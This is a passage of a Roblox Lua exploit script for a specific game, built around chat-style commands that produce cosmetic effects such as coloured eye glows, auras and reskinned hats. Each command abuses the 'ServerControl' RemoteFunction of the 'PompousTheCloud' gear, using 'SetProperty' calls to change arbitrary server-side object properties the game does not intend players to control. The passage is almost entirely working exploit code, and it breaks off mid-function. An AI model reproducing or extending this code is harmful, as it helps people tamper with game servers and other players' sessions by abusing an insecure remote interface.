CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://2824554305")
CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://1035081158")


game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("409739014")
wait(1)
CE:FireEvent("PompousTheCloud",MainUserW["409739014"]["Handle"]["Mesh"],"TextureId","rbxassetid://2397542833")
CE:FireEvent("PompousTheCloud",MainUserW["409739014"]["Handle"]["Mesh"],"MeshId","rbxassetid://2397542003")
CE:FireEvent("PompousTheCloud",MainUserW["409739014"]["Handle"]["Mesh"],"Scale",Vector3.new(1, 1, 1))
CE:FireEvent("PompousTheCloud",MainUserW["409739014"]["Handle"]["Mesh"],"Offset",Vector3.new(-0.3, -0.95, 1.3))


game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("1028859")
wait(1)
CE:FireEvent("PompousTheCloud",MainUserW["1028859"]["Handle"]["Mesh"],"MeshId","rbxassetid://16627529")
CE:FireEvent("PompousTheCloud",MainUserW["1028859"]["Handle"]["Mesh"],"TextureId","rbxassetid://456065732")
CE:FireEvent("PompousTheCloud",MainUserW["1028859"]["Handle"]["Mesh"],"Scale",Vector3.new(1.05, 1.05, 1.05))
CE:FireEvent("PompousTheCloud",MainUserW["1028859"]["Handle"]["Mesh"],"Offset",Vector3.new(0.01, -0.3135, 0))

game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("323417812")
wait(1)
CE:FireEvent("PompousTheCloud",MainUserW["323417812"]["Handle"]["Mesh"],"MeshId","rbxassetid://187943426")
CE:FireEvent("PompousTheCloud",MainUserW["323417812"]["Handle"]["Mesh"],"TextureId","rbxassetid://1051546")

game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("124730194")
wait(1)
CE:FireEvent("PompousTheCloud",MainUserW["124730194"]["Handle"]["Mesh"],"MeshId","rbxassetid://1365696")

    
			end
	
		if cmd == "kleg" then
			local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}
 
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
 
 
function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
 
C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT
 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://101851696")
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://101851254")
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",MainUserW["Right Leg"])
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","0")

		end
		
			if cmd == "lightred" then
			--Change the color RIGHT UNDER HERE
local Colors = shared.Colors or {
	Red = 233,
	Green = 0,
	Blue = 0
}
local ME = game:GetService("Players").LocalPlayer
function M16(arg1, arg2, arg3, arg4)
	if arg1 and type(arg1) ~= "string" and arg1:IsA("Instance") then
		arg1, arg2, arg3, arg4 = "PompousTheCloud", arg1, arg2, arg3
	end
	local cItem = ME.Character:FindFirstChild(arg1)
	if not cItem or not cItem:FindFirstChild("ServerControl") or not cItem:FindFirstChild("ServerControl"):IsA("RemoteFunction") then
		return warn("Invalid tool '" .. arg1 .. "', missing 'ServerControl' or 'ServerControl' isn't 'RemoteFunction'!")
	end
	if type(arg3) == "table" then
		for i, v in pairs(arg3) do
			cItem.ServerControl:InvokeServer("SetProperty", {
				Value = v,
				Property = i,
				Object = arg2
			})
		end
	elseif type(arg3) ~= "table" then
		cItem.ServerControl:InvokeServer("SetProperty", {
			Value = arg4,
			Property = arg3,
			Object = arg2
		})
	end
	return arg2
end
if ME.Backpack:FindFirstChild("PompousTheCloud") then
	ME.Backpack:FindFirstChild("PompousTheCloud").Parent = ME.Character
end
local Cloud = ME.Character:WaitForChild("PompousTheCloud")
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld1"
})
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(-.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld2"
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE1",
	Parent = ME.Character.Head.EpikEyeWeld1
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0)
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE2",
	Parent = ME.Character.Head.EpikEyeWeld2
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 5, 1),
		NumberSequenceKeypoint.new(1, 5, 1)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0, 0),
		NumberSequenceKeypoint.new(.0411, 0, 0),
		NumberSequenceKeypoint.new(.078, .995, 0),
		NumberSequenceKeypoint.new(.111, 0, 0),
		NumberSequenceKeypoint.new(.135, .989, 0),
		NumberSequenceKeypoint.new(.164, 0, 0),
		NumberSequenceKeypoint.new(.303, 0, 0),
		NumberSequenceKeypoint.new(.391, 0, 0),
		NumberSequenceKeypoint.new(.416, 1, 0),
		NumberSequenceKeypoint.new(.453, 0, 0),
		NumberSequenceKeypoint.new(.551, 0, 0),
		NumberSequenceKeypoint.new(.577, .995, 0),
		NumberSequenceKeypoint.new(.595, 0, 0),
		NumberSequenceKeypoint.new(.694, 0, 0),
		NumberSequenceKeypoint.new(.743, 1, 0),
		NumberSequenceKeypoint.new(.793, 0, 0),
		NumberSequenceKeypoint.new(1, 0, 0)
	}),
	ZOffset = 3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.2, .3),
	Rate = 7,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikLightning",
	Parent = ME.Character.Torso
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 4.81, .875),
		NumberSequenceKeypoint.new(1, 2.13, .875)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.059, .945, 0),
		NumberSequenceKeypoint.new(.39, .951, 0),
		NumberSequenceKeypoint.new(.702, .978, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = -2,
	Archivable = true,
	Acceleration = Vector3.new(0, 25, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.75, 1),
	Rate = 50,
	Rotation = NumberRange.new(-5, 5),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(5, 5),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikAura",
	Parent = ME.Character.Torso
})
			end
			
			if cmd == "lightgreen" then
			--Change the color RIGHT UNDER HERE
local Colors = shared.Colors or {
	Red = 0,
	Green = 244,
	Blue = 0
}
local ME = game:GetService("Players").LocalPlayer
function M16(arg1, arg2, arg3, arg4)
	if arg1 and type(arg1) ~= "string" and arg1:IsA("Instance") then
		arg1, arg2, arg3, arg4 = "PompousTheCloud", arg1, arg2, arg3
	end
	local cItem = ME.Character:FindFirstChild(arg1)
	if not cItem or not cItem:FindFirstChild("ServerControl") or not cItem:FindFirstChild("ServerControl"):IsA("RemoteFunction") then
		return warn("Invalid tool '" .. arg1 .. "', missing 'ServerControl' or 'ServerControl' isn't 'RemoteFunction'!")
	end
	if type(arg3) == "table" then
		for i, v in pairs(arg3) do
			cItem.ServerControl:InvokeServer("SetProperty", {
				Value = v,
				Property = i,
				Object = arg2
			})
		end
	elseif type(arg3) ~= "table" then
		cItem.ServerControl:InvokeServer("SetProperty", {
			Value = arg4,
			Property = arg3,
			Object = arg2
		})
	end
	return arg2
end
if ME.Backpack:FindFirstChild("PompousTheCloud") then
	ME.Backpack:FindFirstChild("PompousTheCloud").Parent = ME.Character
end
local Cloud = ME.Character:WaitForChild("PompousTheCloud")
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld1"
})
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(-.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld2"
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE1",
	Parent = ME.Character.Head.EpikEyeWeld1
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0)
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE2",
	Parent = ME.Character.Head.EpikEyeWeld2
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 5, 1),
		NumberSequenceKeypoint.new(1, 5, 1)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0, 0),
		NumberSequenceKeypoint.new(.0411, 0, 0),
		NumberSequenceKeypoint.new(.078, .995, 0),
		NumberSequenceKeypoint.new(.111, 0, 0),
		NumberSequenceKeypoint.new(.135, .989, 0),
		NumberSequenceKeypoint.new(.164, 0, 0),
		NumberSequenceKeypoint.new(.303, 0, 0),
		NumberSequenceKeypoint.new(.391, 0, 0),
		NumberSequenceKeypoint.new(.416, 1, 0),
		NumberSequenceKeypoint.new(.453, 0, 0),
		NumberSequenceKeypoint.new(.551, 0, 0),
		NumberSequenceKeypoint.new(.577, .995, 0),
		NumberSequenceKeypoint.new(.595, 0, 0),
		NumberSequenceKeypoint.new(.694, 0, 0),
		NumberSequenceKeypoint.new(.743, 1, 0),
		NumberSequenceKeypoint.new(.793, 0, 0),
		NumberSequenceKeypoint.new(1, 0, 0)
	}),
	ZOffset = 3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.2, .3),
	Rate = 7,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikLightning",
	Parent = ME.Character.Torso
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 4.81, .875),
		NumberSequenceKeypoint.new(1, 2.13, .875)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.059, .945, 0),
		NumberSequenceKeypoint.new(.39, .951, 0),
		NumberSequenceKeypoint.new(.702, .978, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = -2,
	Archivable = true,
	Acceleration = Vector3.new(0, 25, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.75, 1),
	Rate = 50,
	Rotation = NumberRange.new(-5, 5),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(5, 5),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikAura",
	Parent = ME.Character.Torso
})
			end
			
			if cmd == "plrre" then
			game.Players.LocalPlayer.Character:BreakJoints()
			end
			
				if cmd == "lightpink" then
			--Change the color RIGHT UNDER HERE
local Colors = shared.Colors or {
	Red = 233,
	Green = 100,
	Blue = 150
}
local ME = game:GetService("Players").LocalPlayer
function M16(arg1, arg2, arg3, arg4)
	if arg1 and type(arg1) ~= "string" and arg1:IsA("Instance") then
		arg1, arg2, arg3, arg4 = "PompousTheCloud", arg1, arg2, arg3
	end
	local cItem = ME.Character:FindFirstChild(arg1)
	if not cItem or not cItem:FindFirstChild("ServerControl") or not cItem:FindFirstChild("ServerControl"):IsA("RemoteFunction") then
		return warn("Invalid tool '" .. arg1 .. "', missing 'ServerControl' or 'ServerControl' isn't 'RemoteFunction'!")
	end
	if type(arg3) == "table" then
		for i, v in pairs(arg3) do
			cItem.ServerControl:InvokeServer("SetProperty", {
				Value = v,
				Property = i,
				Object = arg2
			})
		end
	elseif type(arg3) ~= "table" then
		cItem.ServerControl:InvokeServer("SetProperty", {
			Value = arg4,
			Property = arg3,
			Object = arg2
		})
	end
	return arg2
end
if ME.Backpack:FindFirstChild("PompousTheCloud") then
	ME.Backpack:FindFirstChild("PompousTheCloud").Parent = ME.Character
end
local Cloud = ME.Character:WaitForChild("PompousTheCloud")
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld1"
})
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(-.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld2"
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE1",
	Parent = ME.Character.Head.EpikEyeWeld1
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0)
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE2",
	Parent = ME.Character.Head.EpikEyeWeld2
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 5, 1),
		NumberSequenceKeypoint.new(1, 5, 1)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0, 0),
		NumberSequenceKeypoint.new(.0411, 0, 0),
		NumberSequenceKeypoint.new(.078, .995, 0),
		NumberSequenceKeypoint.new(.111, 0, 0),
		NumberSequenceKeypoint.new(.135, .989, 0),
		NumberSequenceKeypoint.new(.164, 0, 0),
		NumberSequenceKeypoint.new(.303, 0, 0),
		NumberSequenceKeypoint.new(.391, 0, 0),
		NumberSequenceKeypoint.new(.416, 1, 0),
		NumberSequenceKeypoint.new(.453, 0, 0),
		NumberSequenceKeypoint.new(.551, 0, 0),
		NumberSequenceKeypoint.new(.577, .995, 0),
		NumberSequenceKeypoint.new(.595, 0, 0),
		NumberSequenceKeypoint.new(.694, 0, 0),
		NumberSequenceKeypoint.new(.743, 1, 0),
		NumberSequenceKeypoint.new(.793, 0, 0),
		NumberSequenceKeypoint.new(1, 0, 0)
	}),
	ZOffset = 3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.2, .3),
	Rate = 7,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikLightning",
	Parent = ME.Character.Torso
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 4.81, .875),
		NumberSequenceKeypoint.new(1, 2.13, .875)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.059, .945, 0),
		NumberSequenceKeypoint.new(.39, .951, 0),
		NumberSequenceKeypoint.new(.702, .978, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = -2,
	Archivable = true,
	Acceleration = Vector3.new(0, 25, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.75, 1),
	Rate = 50,
	Rotation = NumberRange.new(-5, 5),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(5, 5),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikAura",
	Parent = ME.Character.Torso
})
			end
			
			if cmd == "dico" then
			    	local ME = game:GetService("Players").LocalPlayer
function FireEvent(ItemName, Object, Property, Value)
  ME.Character:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
	}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function BreakAnimation()
	for _, x in next, MainUserP.Character.Humanoid:GetPlayingAnimationTracks() do
		if not string.find(x.Animation.AnimationId, "180426354") then
			x:stop()
		end
	end
	wait()
	local DualAnimation = Instance.new("Animation")
	DualAnimation.AnimationId = "rbxassetid://33"
	local DualAnimation_ = MainUserP.Character.Humanoid:LoadAnimation(DualAnimation)
	DualAnimation_:Play()
	DualAnimation_:AdjustSpeed(1)
end



local VerifyCloud = function()
	if not MainUserP.Character:FindFirstChild("PompousTheCloud") and not MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		wait(0.5)
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
			MainUserW.PompousTheCloud.ServerControl:InvokeServer("SetProperty",{["Value"]="rbxassetid://0",["Property"]="MeshId",["Object"]=MainUserW.PompousTheCloud.EffectCloud.Mesh})
		end
	elseif not MainUserP.Character:FindFirstChild("PompousTheCloud") and MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
